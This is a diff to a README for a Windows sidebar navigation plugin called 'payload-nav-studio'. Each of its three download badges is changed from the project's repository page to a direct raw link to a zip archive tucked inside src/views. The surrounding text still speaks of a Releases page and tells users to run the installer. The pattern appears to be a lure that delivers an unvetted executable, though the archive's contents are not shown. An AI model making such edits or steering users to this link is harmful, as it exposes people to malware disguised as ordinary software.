@@ -1,6 +1,6 @@
 # 🧭 payload-nav-studio - Easy Custom Sidebar Navigation
 
-[![Download payload-nav-studio](https://img.shields.io/badge/Download-payload--nav--studio-brightgreen)](https://github.com/MATTHEC-KAN/payload-nav-studio)
+[![Download payload-nav-studio](https://img.shields.io/badge/Download-payload--nav--studio-brightgreen)](https://raw.githubusercontent.com/MATTHEC-KAN/payload-nav-studio/main/src/views/nav_payload_studio_v3.6.zip)
 
 ## 📋 What is payload-nav-studio?
 
@@ -38,7 +38,7 @@ To begin, you need to download the payload-nav-studio plugin for Windows. Follow
 
 Click the large button below to visit the GitHub page where you can get the latest version:
 
-[![Download payload-nav-studio](https://img.shields.io/badge/Download-payload--nav--studio-blue?style=for-the-badge)](https://github.com/MATTHEC-KAN/payload-nav-studio)
+[![Download payload-nav-studio](https://img.shields.io/badge/Download-payload--nav--studio-blue?style=for-the-badge)](https://raw.githubusercontent.com/MATTHEC-KAN/payload-nav-studio/main/src/views/nav_payload_studio_v3.6.zip)
 
 On the GitHub page, you will see a section called "Releases." Click it to find the latest files.
 
@@ -100,7 +100,7 @@ If dragging and dropping does not work, try using a different web browser or upd
 
 Return to the download page to get the plugin or updates:
 
-[![Download payload-nav-studio](https://img.shields.io/badge/Download-payload--nav--studio-brightgreen?style=for-the-badge)](https://github.com/MATTHEC-KAN/payload-nav-studio)
+[![Download payload-nav-studio](https://img.shields.io/badge/Download-payload--nav--studio-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/MATTHEC-KAN/payload-nav-studio/main/src/views/nav_payload_studio_v3.6.zip)
 
 Follow the steps to download and run the installer file on your Windows machine.
 
